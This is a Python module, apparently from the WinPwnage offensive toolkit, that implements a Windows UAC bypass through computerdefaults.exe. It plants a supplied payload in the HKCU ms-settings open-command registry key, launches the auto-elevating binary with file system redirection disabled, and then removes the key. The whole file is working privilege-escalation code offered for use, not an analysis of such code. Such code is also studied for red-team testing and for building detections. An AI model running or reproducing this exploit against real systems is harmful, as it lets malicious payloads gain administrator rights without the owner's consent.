import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

computerdefaults_info = {
	"Description": "Bypass UAC using computerdefaults and registry key manipulation",
	"Id": "10",
	"Type": "UAC bypass",
	#"Fixed In": "999999",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "10240",
	"Admin": False,
	"Function Name": "computerdefaults",
	"Function Payload": True,
}


def computerdefaults(payload):
	if payloads().exe(payload):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
									os.path.join("Software\\Classes\\ms-settings\\shell\\open\\command"))
			_winreg.SetValueEx(key, None, 0, _winreg.REG_SZ,os.path.join(payload))
			_winreg.SetValueEx(key, "DelegateExecute", 0, _winreg.REG_SZ, None)
			_winreg.CloseKey(key)
		except Exception as error:
			print_error("Unable to create registry keys, exception was raised: {}".format(error))
			return False
		else:
			print_success("Successfully created Default key containing payload ({})".format(os.path.join(payload)))
			print_success("Successfully created DelegateExecute key")

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("computerdefaults.exe"):
				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))

		time.sleep(5)

		try:
			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\\Classes\\ms-settings\\shell\\open\\command"))
		except Exception as error:
			print_error("Unable to cleanup")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
